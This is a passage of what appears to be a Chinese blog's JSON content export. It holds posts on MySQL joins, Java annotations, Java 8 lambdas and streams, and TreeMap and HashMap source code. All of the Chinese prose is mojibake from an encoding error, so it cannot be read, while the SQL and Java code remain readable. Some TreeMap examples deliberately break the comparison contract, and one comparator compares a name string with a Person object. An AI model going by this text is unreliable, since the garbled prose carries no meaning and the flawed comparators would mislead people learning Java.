joinä¸joinæ˜¯ç›¸åŒçš„ SELECT * FROM names INNER JOIN addresses ON names.id = addresses.id; SELECT * FROM names JOIN addresses ON names.id = addresses.id; LEFT JOINæ˜¯è¿”å›å·¦è¡¨çš„å…¨éƒ¨è¡Œå’Œå³è¡¨æ»¡è¶³ONå…³ç³»ï¼Œå¦‚æœå·¦è¡¨çš„è¡Œåœ¨å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œå³è¡¨ä¸­å¯¹åº”æ•°æ®å°±ç”¨NULLä»£æ›¿ SELECT * FROM names LEFT JOIN addresses ON names.id = addresses.id; RIGHT JOINè¿”å›å³è¡¨çš„å…¨éƒ¨è¡Œå’Œå·¦è¡¨æ»¡è¶³ONæ¡ä»¶çš„è¡Œï¼Œå¦‚æœå³è¡¨çš„è¡Œåœ¨å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œå·¦è¡¨ä¸­å¯¹åº”æ•°æ®ç”¨NULLä»£æ›¿ã€‚ SELECT * FROM names RIGHT JOIN addresses ON names.id = addresses.id; å½“ç„¶è¿˜æœ‰å…¨è¿æ¥FULL OUTER JOINä¼šä»å·¦è¡¨ å’Œå³è¡¨ é‚£é‡Œè¿”å›æ‰€æœ‰çš„è¡Œã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨çš„æ•°æ®è¡Œåœ¨å¦ä¸€ä¸ªè¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œé‚£ä¹ˆå¯¹é¢çš„æ•°æ®ç”¨NULLä»£æ›¿å½“ç„¶äº†ï¼Œmysqlä¸­å¹¶ä¸æ”¯æŒfull outer joinåªèƒ½ç”¨unionæ¥æ›¿ä»£ SELECT * FROM names LEFT JOIN addresses ON names.id = addresses.id UNION SELECT * FROM names RIGHT JOIN addresses ON names.id = addresses.id å› ä¸ºä¸Šè¯¾ä¸è®¤çœŸå¬è®²ï¼Œæ€»æ˜¯æ„Ÿè§‰å­¦çš„ä¸å¤Ÿå…¨é¢ï¼Œæ‰€ä»¥ä¸“é—¨æŠ½ç©ºè¡¥è¯¾äº†mysqlçš„ä¹¦ï¼Œæœ€è¿‘åœ¨çœ‹mysql å¿…çŸ¥å¿…ä¼šä»¥ä¸Šå†…å®¹å­¦ä¹ æ¥è‡ªä»¥ä¸‹åšå®¢ https://www.cnblogs.com/tigerhsu/p/5113938.html https://www.cnblogs.com/reaptomorrow-flydream/p/8145610.html äº²åŠ›è€Œä¸ºï¼ˆåŠ›å¥½åƒé”™äº†ï¼‰","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"join","slug":"join","permalink":"http://yoursite.com/tags/join/"}]},{"title":"java annotation","slug":"java annotation","date":"2018-08-17T11:19:57.000Z","updated":"2020-11-14T17:11:16.194Z","comments":true,"path":"2018/08/17/java annotation/","link":"","permalink":"http://yoursite.com/2018/08/17/java%20annotation/","excerpt":"","text":"java annotation æ³¨è§£å®˜æ–¹è§£é‡Šï¼š ****æ³¨è§£ æ˜¯ä¸€ç³»åˆ—å…ƒæ•°æ®ï¼Œå®ƒæä¾›æ•°æ®ç”¨æ¥è§£é‡Šç¨‹åºä»£ç ï¼Œä½†æ˜¯æ³¨è§£å¹¶éæ˜¯æ‰€è§£é‡Šçš„ä»£ç æœ¬èº«çš„ä¸€éƒ¨åˆ†ã€‚æ³¨è§£å¯¹äºä»£ç çš„è¿è¡Œæ•ˆæœæ²¡æœ‰ç›´æ¥å½±å“æ³¨è§£æœ‰å¾ˆå¤šå¥½å¤„ ï¼Œä¸»è¦å¦‚ä¸‹ï¼š-æä¾›ä¿¡æ¯ç»™ç¼–è¯‘å™¨ï¼šç¼–è¯‘å™¨å¯ä»¥åˆ©ç”¨æ³¨è§£æ¥æ¢æµ‹é”™è¯¯å’Œè­¦å‘Šä¿¡æ¯-ç¼–è¯‘é˜¶æ®µæ—¶çš„å¤„ç†ï¼šè½¯ä»¶å·¥å…·å¯ä»¥åˆ©ç”¨æ³¨è§£ä¿¡æ¯æ¥ç”Ÿæˆä»£ç ï¼ŒHtmlæ–‡æ¡£æˆ–è€…å…¶ä»–ç›¸åº”å¤„ç†-è¿è¡Œæ—¶çš„å¤„ç†ï¼šæŸäº›æ³¨è§£å¯ä»¥åœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™æ¥å—ä»£ç çš„æå– é¦–å…ˆè®²è§£ä¸€ä¸‹annotationå…·ä½“çš„è¡¨ç°å½¢å¼ï¼š package com.husky.reflection.main.annotation; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; @Retention(RetentionPolicy.RUNTIME) public @interface Check { } package com.husky.reflection.main.annotation; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @author husky * æ³¨é‡Š@TableSQLï¼Œåªå®šä¹‰ä¸€ä¸ªvalueå€¼æ¥æ˜ å°„è¡¨åï¼Œé»˜è®¤å€¼ä¸ºç©ºã€‚ * å¦‚æœç¨‹åºä¸ç»™æ­¤å€¼ï¼Œå°†ä½¿ç”¨ç±»åï¼ˆå°å†™ï¼‰æ¥ä½œä¸ºè¡¨å * */ @Target(ElementType.TYPE)//å®šä¹‰æ³¨é‡Šåº”ç”¨äºç±» @Retention(RetentionPolicy.RUNTIME)//å®šä¹‰æ³¨é‡Šåœ¨jvmè¿è¡Œæ—¶ä¿ç•™ public @interface TableSQL { String value() default &quot;&quot;; } package com.husky.reflection.main.annotation; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; @Target(ElementType.FIELD)//å®šä¹‰æ³¨è§£åº”ç”¨äºæˆå‘˜å˜é‡ @Retention(RetentionPolicy.RUNTIME)//å®šä¹‰æ³¨è§£åœ¨jvmè¿è¡Œæ—¶ä¿ç•™ public @interface TableColumnSQL { String value() default &quot;&quot;; Constraint constraint() default @Constraint(); }æ³¨è§£è¿ç”¨çš„åœ°æ–¹å¾ˆå¤šï¼šå¯ä»¥ç»™ç±»åŠ æ³¨è§£ï¼Œä¹Ÿå¯ä»¥ç»™å˜é‡åŠ æ³¨è§£ï¼Œç­‰ç­‰å…·ä½“å¦‚ä¸‹ï¼šç»™ç±»åŠ æ³¨è§£ @TestAnnotation() public class Test {}ç»™å˜é‡åŠ æ³¨è§£ @Check(&quot;hi&quot;) int a;*å¦‚æœæ²¡æœ‰ç”¨æ¥è¯»å–æ³¨è§£çš„å·¥å…·ï¼Œé‚£æ³¨è§£å°†æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œå®ƒä¹Ÿä¸ä¼šæ¯”æ³¨é‡Šæ›´æœ‰ç”¨ã€‚è¯»å–æ³¨è§£çš„å·¥å…·å«ä½œæ³¨è§£å¤„ç†å™¨ã€‚javaæä¾›äº†ä¸¤ç§æ–¹å¼æ¥å¤„ç†æ³¨è§£ï¼šç¬¬ä¸€ç§æ˜¯åˆ©ç”¨è¿è¡Œæ—¶åå°„æœºåˆ¶ï¼›å¦ä¸€ç§ä½¿ç”¨javaæä¾›çš„apiæ¥å¤„ç†ç¼–è¯‘æœŸçš„æ³¨è§£* è¿™å°±è¿ç”¨åˆ°äº†javareflectionåå°„ï¼Œåœ¨è¿è¡Œæ—¶ï¼Œé€šè¿‡è·å–classï¼Œç„¶åé€šè¿‡getDeclaredAnnotations()è·å–ç±»çš„Annotationï¼Œæ ¹æ®ç±»çš„Annotationæ¥å®ç°ä¸€äº›åŠ¨ä½œ å½“ç„¶ï¼Œé€šè¿‡classè·å–æ‰€æœ‰å˜é‡Fieldï¼Œç„¶åæ ¹æ®å˜é‡Fieldè·å–Annotationæ¥å®ç°ä¸€äº›åŠ¨ä½œ ä¸‹é¢ï¼šå…·ä½“è®²è§£å‡ ä¸ªåœ¨åº”ç”¨ä¸­çš„@Testæ˜¯junitæ¡†æ¶ä¸­æ³¨è§£ public class ExampleUnitTest { @Test public void addition_isCorrect() throws Exception { assertEquals(4, 2 + 2); } }ButterKnifeandroidä¸­çš„iocæ¡†æ¶ public class MainActivity extends AppCompatActivity { @BindView(R.id.tv_test) TextView mTv; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ButterKnife.bind(this); } }å½“ç„¶è¿˜æœ‰ä¸€äº›æ³¨å…¥ï¼Œ@Resourceï¼Œ@AutoWriedä»€ä¹ˆçš„ å…·ä½“çš„å°å®ä¾‹ï¼šå¯ä»¥å‚è€ƒä»¥ä¸‹ä¸¤ä¸ªä¾‹å­ å¯¹ç±»ä¸­æ–¹æ³•è¿›è¡Œæµ‹è¯• é€šè¿‡å¯¹ç±»è¿›è¡Œæ³¨è§£æ¥ç”Ÿæˆå»ºè¡¨è¯­å¥ å…·ä½“æºç åœ¨ å¯èƒ½ä¼šæ…¢ä¸€ç‚¹ï¼Œæ˜å¤©è‚¯å®šä¼šä¸Šä¼ æˆåŠŸ æœ¬æ–‡ç« å‚è€ƒäºï¼š https://blog.csdn.net/briblue/article/details/73824058 https://blog.zenfery.cc/hexo/articles/annotation-2.html http://ifeve.com/java-reflection/ ä»Šå¤©æ˜¯ä¸ƒå¤•ï¼Œå‡†å¤‡å‡ºå»å¤œè·‘ï¼Œå¤§å®¶å¿«ä¹","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"åå°„","slug":"åå°„","permalink":"http://yoursite.com/tags/%E5%8F%8D%E5%B0%84/"}]},{"title":"java8 lambda","slug":"java8 lambda","date":"2018-08-08T07:10:11.000Z","updated":"2020-11-14T17:11:16.699Z","comments":true,"path":"2018/08/08/java8 lambda/","link":"","permalink":"http://yoursite.com/2018/08/08/java8%20lambda/","excerpt":"","text":"*1.åŒ¿åå†…éƒ¨ç±» * @Test public void oldRunable(){ new Thread(new Runnable() { @Override public void run() { System.out.println(&quot;the old runable now is using&quot;); } }).start(); } @Test public void runable(){ new Thread(() -&gt; System.out.println(&quot;It&apos;s lambda function&quot;)).start(); } //æœ€åè¾“å‡º //the old runable now is using //It&apos;s lambda function*2.lambdaå¯¹é›†åˆçš„æ“ä½œ *å¯¹listéå† @Test public void iterTest(){ List&lt;String&gt; languages = Arrays.asList(&quot;java&quot;,&quot;python&quot;,&quot;scala&quot;); //before java8 for(String language : languages){ System.out.println(language); } //after java8 languages.stream().forEach(x-&gt;System.out.println(x)); //æ­¤å¤„streamæ˜¯java8ä¸­çš„æ–°çš„ä¸€ç§æ–¹å¼ï¼Œä½ ä¼šå‘ç°å†™äº†stream()çš„å’Œä¸‹é¢çš„ä¸€å¥æ²¡æœ‰åŒºåˆ«ï¼Œè¿™ç§æ˜¯java8ä¸­çš„æµå¼APIï¼Œæˆ‘å°†åœ¨ä¸‹ä¸€ç¯‡åšå®¢ä¸“é—¨å†™è¿™ä¸ªæµå¼api languages.forEach(x-&gt;System.out.println(x); //æ­¤å¤„ä¹Ÿæ˜¯å¯¹åŒ¿åå†…éƒ¨ç±»å†™æˆäº†lambdaå½¢å¼ languages.forEach(new Consumer&lt;String&gt;() { @Override public void accept(String s) { System.out.println(s); } }); languages.forEach(System.out::println);//è¿™å¥ä¹Ÿæ˜¯å¯ä»¥çš„ }*3.ç”¨lambdaè¡¨è¾¾å¼å®ç°map *mapæ˜¯å‡½æ•°å¼ç¼–ç¨‹é‡Œé¢é‡è¦çš„å‡½æ•°ï¼Œå°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ä¸ª @Test public void mapTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,200.0,30.0,100.0,200.0); cost.stream().map(x-&gt;x+x*0.5).forEach(System.out::println); } /** è¾“å‡ºç»“æœ 15.0 300.0 45.0 150.0 300.0 */*4.lambdaå®ç°mapå’Œreduce *mapå’Œreduceä¸€æ ·ï¼Œmapæ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºå¦ä¸€ä¸ªï¼Œè€Œreduceæ˜¯å°†å¤šä¸ªè½¬åŒ–ä¸ºä¸€ä¸ª @Test public void mapReduceTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0); Double allCost = cost.stream().map(x-&gt;x+0.5*x).reduce((sum,x)-&gt;sum+x).get(); //æ­¤å¤„å°±æ˜¯æµï¼ˆstreamï¼‰å¼api // Double allCost2 = cost.stream().map(x-&gt;x+0.5*x).reduce(new BinaryOperator&lt;Double&gt;() { // @Override // public Double apply(Double aDouble, Double aDouble2) { // return aDouble+aDouble2; // } // }).get(); System.out.println(allCost); } //è¾“å‡ºç»“æœ //90.0åœ¨java8ä¹‹å‰ @Test public void sumTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0); double sum = 0.0; for(double each : cost){ each += each * 0.5; sum += each; } System.out.println(sum); }*5.filter *filteræ˜¯ç­›é€‰ @Test public void filterTest(){ List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0,40.0); cost.stream().filter(x-&gt;x&gt;25).forEach(x-&gt;System.out.println(x)); // cost.stream().filter(new Predicate&lt;Double&gt;() { // @Override // public boolean test(Double aDouble) { // if(aDouble &gt;10.0){ // return true; // }else { // return false; // } // } // }).forEach(x-&gt;System.out.println(x)); }*6.ä¸å‡½æ•°å¼æ¥å£Predicateé…åˆ *é™¤äº†åœ¨è¯­è¨€å±‚é¢æ”¯æŒå‡½æ•°å¼ç¼–ç¨‹é£æ ¼ï¼ŒJava 8ä¹Ÿæ·»åŠ äº†ä¸€ä¸ªåŒ…ï¼Œå«åšjava.util.functionã€‚å®ƒåŒ…å«äº†å¾ˆå¤šç±»ï¼Œç”¨æ¥æ”¯æŒJavaçš„å‡½æ•°å¼ç¼–ç¨‹ã€‚å…¶ä¸­ä¸€ä¸ªä¾¿æ˜¯Predicateï¼Œä½¿ç”¨java.util.function.Predicateå‡½æ•°å¼æ¥å£ä»¥åŠlambdaè¡¨è¾¾å¼ï¼Œå¯ä»¥å‘APIæ–¹æ³•æ·»åŠ é€»è¾‘ï¼Œç”¨æ›´å°‘çš„ä»£ç æ”¯æŒæ›´å¤šçš„åŠ¨æ€è¡Œä¸ºã€‚Predicateæ¥å£éå¸¸é€‚ç”¨äºåšè¿‡æ»¤ã€‚ public static void filterTest(List&lt;String&gt; langeages,Predicate&lt;String&gt; condition){ langeages.stream().filter(x-&gt;condition.test(x)).forEach(System.out::println); } @Test public void filterTestDemo(){ List&lt;String&gt; languages = Arrays.asList(&quot;Java&quot;,&quot;Python&quot;,&quot;Scale&quot;,&quot;Shell&quot;,&quot;R&quot;); System.out.println(&quot;Languages starts with J:&quot;); filterTest(languages,x-&gt;x.startsWith(&quot;J&quot;)); System.out.println(&quot;Languages end with a&quot;); filterTest(languages,x-&gt;x.endsWith(&quot;a&quot;)); System.out.println(&quot;All languages:&quot;); filterTest(languages,x-&gt;true); System.out.println(&quot;No languages&quot;); filterTest(languages,x-&gt;false); System.out.println(&quot;Language longer than 4&quot;); filterTest(languages,x-&gt;x.length()&gt;4); } /** è¾“å‡ºç»“æœ Languages starts with J: Java Languages end with a Java All languages: Java Python Scale Shell R No languages Language longer than 4 Python Scale Shell */*7.TreeMap *person.java package com.husky; public class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return &quot;Person{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &apos;}&apos;; } } @Test public void treeMapTest(){ TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person,Integer&gt;((o1, o2) -&gt; o1.getName().compareTo(o2.getName())); Person person = new Person(&quot;husky&quot;); Person person1 = new Person(&quot;adios&quot;); Person person2 = new Person(&quot;husky&quot;); treeMap.put(person,1); treeMap.put(person1,2); treeMap.put(person2,3); Iterator&lt;Map.Entry&lt;Person,Integer&gt;&gt; it = treeMap.entrySet().iterator(); while(it.hasNext()){ Map.Entry&lt;Person,Integer&gt; m = it.next(); System.out.println(m.getKey()); System.out.println(m.getValue()); } } //è¾“å‡ºç»“æœ /** Person{name=&apos;adios&apos;} 2 Person{name=&apos;husky&apos;} 3 */ è¶…é“¾æ¥å­¦ä¹ ","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"TreeMapæºç é˜…è¯»","slug":"TreeMapæºç é˜…è¯»","date":"2018-07-19T04:40:21.000Z","updated":"2020-11-14T17:11:17.217Z","comments":true,"path":"2018/07/19/TreeMapæºç é˜…è¯»/","link":"","permalink":"http://yoursite.com/2018/07/19/TreeMap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","excerpt":"","text":"åŸºæœ¬ç»“æ„ private final Comparator&lt;? super K&gt; comparator; private transient Entry&lt;K,V&gt; root; //æ ¹èŠ‚ç‚¹ /** * The number of entries in the tree */ private transient int size = 0; //å…ƒç´ ä¸ªæ•° /** * The number of structural modifications to the tree. */ private transient int modCount = 0; //æ ‘ç»“æ„ä¿®æ”¹æ•° //ä¸‹é¢æ˜¯æ ¹èŠ‚ç‚¹çš„ç»“æ„ï¼Œçº¢é»‘æ ‘ static final class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; { K key; V value; Entry&lt;K,V&gt; left; Entry&lt;K,V&gt; right; Entry&lt;K,V&gt; parent; boolean color = BLACK; /** * Make a new cell with given key, value, and parent, and with * {@code null} child links, and BLACK color. */ Entry(K key, V value, Entry&lt;K,V&gt; parent) { this.key = key; this.value = value; this.parent = parent; } }put public V put(K key, V value) { Entry&lt;K,V&gt; t = root;//æ ¹èŠ‚ç‚¹ if (t == null) {//å¦‚æœentryå½“ä¸­è¿˜æ²¡æœ‰æ•°æ®ï¼Œåˆå§‹åŒ– compare(key, key); // type (and possibly null) check root = new Entry&lt;&gt;(key, value, null); size = 1;//å…ƒç´ ä¸ªæ•°1 modCount++;//æ ‘ç»“æ„ä¿®æ”¹+1 return null; } int cmp; Entry&lt;K,V&gt; parent; // split comparator and comparable paths Comparator&lt;? super K&gt; cpr = comparator;//è¿™ä¸ªå€¼å¯ä»¥åœ¨TreeMapæ„é€ å‡½æ•°å‡ºåˆå§‹åŒ– if (cpr != null) {//æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡åˆ¤æ–­æ˜¯å¦åœ¨TreeMapåˆå§‹åŒ–æ—¶åˆå§‹åŒ–äº†Comparatorï¼Œå¦‚æœæ˜¯ï¼Œæ¥leftå’Œrightï¼Œä½†=0æ—¶ï¼Œç›´æ¥æ›¿æ¢æ‰ do { parent = t; cmp = cpr.compare(key, t.key); if (cmp &lt; 0) t = t.left; else if (cmp &gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } else {//å¦‚æœæ²¡æœ‰åˆå§‹åŒ–Comparatorï¼Œå°±ä»æ¯”è¾ƒçš„object keyä¸­å–å‡ºComparableï¼Œä¹Ÿå°±æ˜¯keyä¸­impements Comparableæ¥å£ if (key == null) throw new NullPointerException(); @SuppressWarnings(&quot;unchecked&quot;) Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key; do { parent = t; cmp = k.compareTo(t.key); if (cmp &lt; 0) t = t.left; else if (cmp &gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } Entry&lt;K,V&gt; e = new Entry&lt;&gt;(key, value, parent);//æ‰¾åˆ°åï¼Œæ–°å»ºèŠ‚ç‚¹ï¼Œæ ¹æ®cmpç»“æœæ”¾åœ¨å·¦è¾¹å³è¾¹ if (cmp &lt; 0) parent.left = e; else parent.right = e; fixAfterInsertion(e); size++; modCount++; return null; }get public V get(Object key) { Entry&lt;K,V&gt; p = getEntry(key); return (p==null ? null : p.value); } final Entry&lt;K,V&gt; getEntry(Object key) { // Offload comparator-based version for sake of performance if (comparator != null)//è¿™è¾¹æ˜¯treeMapå®ç°äº†Comparatoræ¥å£ return getEntryUsingComparator(key); if (key == null) throw new NullPointerException(); @SuppressWarnings(&quot;unchecked&quot;) Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key; Entry&lt;K,V&gt; p = root; while (p != null) {//è¿™è¾¹æ˜¯ï¼Œæ²¡å®ç°ï¼Œä½†æ˜¯keyè¿™ä¸ªobjectä¸­å®ç°äº†Comparableæ¥å£ int cmp = k.compareTo(p.key); if (cmp &lt; 0) p = p.left; else if (cmp &gt; 0) p = p.right; else return p; } return null; } final Entry&lt;K,V&gt; getEntryUsingComparator(Object key) {\\\\è¿™è¾¹æ˜¯treeMapå®ç°äº†Comparatoræ¥å£ @SuppressWarnings(&quot;unchecked&quot;) K k = (K) key; Comparator&lt;? super K&gt; cpr = comparator; if (cpr != null) { Entry&lt;K,V&gt; p = root; while (p != null) { int cmp = cpr.compare(k, p.key); if (cmp &lt; 0) p = p.left; else if (cmp &gt; 0) p = p.right; else return p; } } return null; } \\\\å…·ä½“æŸ¥è¯¢å°±æ ‘éå†ä¸€æ ·ï¼Œç”¨å­˜æ”¾çš„è§„åˆ™å†æ¥å¯»æ‰¾ ç»“è®ºé¦–å…ˆï¼Œå¦‚æœæƒ³è¦å­˜å…¥è¿›TreeMapä¸­ï¼Œé¦–å…ˆæœ‰å‰æï¼Œ TreeMapåˆå§‹åŒ–çš„æ—¶å€™è¦å®ç°Comparatoræ¥å£ï¼Œå¹¶é‡å†™compareæ–¹æ³• *æˆ–è€…æ˜¯***TreeMapå­˜å…¥çš„keyè¿™ä¸ªobjectå®ç°äº†Comparableæ¥å£ï¼Œå¹¶é‡å†™äº†compareToæ–¹æ³• ä¸‹é¢å®ç°ä¸¤ä¸ªæ–¹æ³•1.object keyä¸­å®ç°Comparableæ¥å£ public class Person implements Comparable&lt;Person&gt; { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return &quot;Person{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &apos;}&apos;; } @Override public int compareTo(Person o) { if(this.name.equals(o.getName())){//è¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘å°†ç›¸åŒçš„ä¿¡æ¯ï¼Œè¿”å›1ï¼Œä¸åŒè¿”å›-1ï¼Œå½“ç„¶è¿™ä¸ç¬¦åˆé€»è¾‘ï¼Œæˆ‘åªæ˜¯å°è¯•ä¸€ä¸‹ return 1; }else{ return -1; } } } import java.util.*; public class TreeMapDemo { public static void main(String[] args){ TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person, Integer&gt;(); treeMap.put(new Person(&quot;husky&quot;),1); treeMap.put(new Person(&quot;husky&quot;),2); treeMap.put(new Person(&quot;husky&quot;),3); Set&lt;Map.Entry&lt;Person,Integer&gt;&gt; entry = treeMap.entrySet(); for(Map.Entry&lt;Person,Integer&gt; e:entry){ System.out.println(e.getKey().getName()+&quot; &quot;+e.getValue()); } } } //è¾“å‡ºç»“æœ /** husky 1 husky 2 husky 3 */2.TreeMapåˆå§‹åŒ–æ˜¯ï¼Œåˆå§‹åŒ–äº†Comparatoræ¥å£ public class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return &quot;Person{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &apos;}&apos;; } } import java.util.*; public class TreeMapDemo { public static void main(String[] args){ TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person, Integer&gt;(new Comparator&lt;Person&gt;() { @Override public int compare(Person o1, Person o2) { if (o1.getName().equals(o2)){ return 1; }else { return -1; } } }); treeMap.put(new Person(&quot;husky&quot;),1); treeMap.put(new Person(&quot;husky&quot;),2); treeMap.put(new Person(&quot;husky&quot;),3); Set&lt;Map.Entry&lt;Person,Integer&gt;&gt; entry = treeMap.entrySet(); for(Map.Entry&lt;Person,Integer&gt; e:entry){ System.out.println(e.getKey().getName()+&quot; &quot;+e.getValue()); } } } /** husky 3 husky 2 husky 1 */å‚è€ƒåšå®¢ javaé›†åˆï¼ˆ6ï¼‰ï¼šTreeMapæºç åˆ†æï¼ˆjdk1.8ï¼‰","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"},{"name":"treemap","slug":"treemap","permalink":"http://yoursite.com/tags/treemap/"}]},{"title":"HashMapå­˜å…¥æ•°æ®æ—¶æºç é˜…è¯»","slug":"HashMapå­˜å…¥æ•°æ®æ—¶æºç é˜…è¯»","date":"2018-07-18T10:57:28.000Z","updated":"2020-11-14T17:11:17.988Z","comments":true,"path":"2018/07/18/HashMapå­˜å…¥æ•°æ®æ—¶æºç é˜…è¯»/","link":"","permalink":"http://yoursite.com/2018/07/18/HashMap%E5%AD%98%E5%85%A5%E6%95%B0%E6%8D%AE%E6%97%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","excerpt":"","text":"é¦–å…ˆjavaç‰ˆæœ¬1.8é¦–å…ˆç¡®å®šçš„æ˜¯ï¼ŒHashMapçš„å­˜å‚¨ç»“æ„çº¦å®šåœ¨å‰é¢çš„æ˜¯æ¡¶åœ¨æ¡¶åé¢çš„é“¾è¡¨æ˜¯binæºç  //hashmapä¸­çš„putæ–¹æ³• public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); //è°ƒç”¨çš„æ˜¯objectçš„hashcodeï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹æ—¶è¦å°†keyçš„hashcodeä¿®æ”¹ï¼Œä»¥åŠåœ¨ä¸‹é¢putValä¸­ä¼šè°ƒç”¨åˆ°equalsæ–¹æ³•ã€‚ //&gt;&gt;&gt; ,&gt;&gt; ,&lt;&lt; æ˜¯javaä¸­ä»…æœ‰çš„ç§»ä½è¿ç®—ç¬¦.&gt;&gt;&gt;æ˜¯æ— ç¬¦å·å³ç§» } final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; //æ­¤å¤„æ˜¯||ï¼Œæ‰€ä»¥åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§tableä¸ºç©ºï¼Œåˆå§‹åŒ–tableï¼Œç¬¬äºŒç§å°†tab.lengthèµ‹ç»™n if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null);//åˆ¤æ–­é€šè¿‡hashè¿ç®—åçš„tabä¸Šæ˜¯å¦æœ‰å€¼ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±æ–°å»º else { Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p;//å¦‚æœä¸¤ä¸ªkeyç›¸åŒï¼Œå°†pç»™èµ‹ç»™eï¼Œä¼šåœ¨ä¸‹æ–¹åˆ¤æ–­eæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œå°†åŸæ¥çš„oldVal = newValï¼› else if (p instanceof TreeNode) //æ­¤å¤„åˆ¤æ–­æ˜¯å¦æ˜¯çº¢é»‘æ ‘ e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);// else {//å½“å‰è¿˜æ˜¯ä¸ºé“¾è¡¨ for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null);//ä»å½“å‰binä¸­éå†ï¼Œéå†åˆ°æœ€åï¼Œåœ¨æœ«å°¾newNodeï¼Œæ’å…¥å€¼ if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st //æ­¤å¤„å·²ç»å¤§äºTREEIFY_THRESHOLDï¼Œæ‰€æœ‰é“¾è¡¨å˜æˆçº¢é»‘æ ‘ treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } if (e != null) { // existing mapping for key //keyå€¼å­˜åœ¨ï¼Œå°±æ›¿æ¢ V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; } } ++modCount; if (++size &gt; threshold)//æ‰©å®¹ resize(); afterNodeInsertion(evict); return null; }è¿˜æœ‰å…·ä½“æ‰©å®¹å˜æ¢è¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹åšå®¢ HashMapçš„æ‰©å®¹åŠæ ‘åŒ–è¿‡ç¨‹ å…·ä½“å‚è€ƒäº†ä»¥ä¸‹å‡ ç¯‡åšå®¢ï¼š https://blog.csdn.net/lianhuazy167/article/details/66967698 https://blog.csdn.net/fan2012huan/article/details/51088211 https://blog.csdn.net/u013412772/article/details/80748604 çœ‹äº†ä¸€ä¸‹åˆçš„æºç ï¼Œç»ˆäºç®—æœ‰ä¸ªå¤§è‡´äº†è§£äº†","categories":[],"tags":[{"name":"Javaå­¦ä¹ 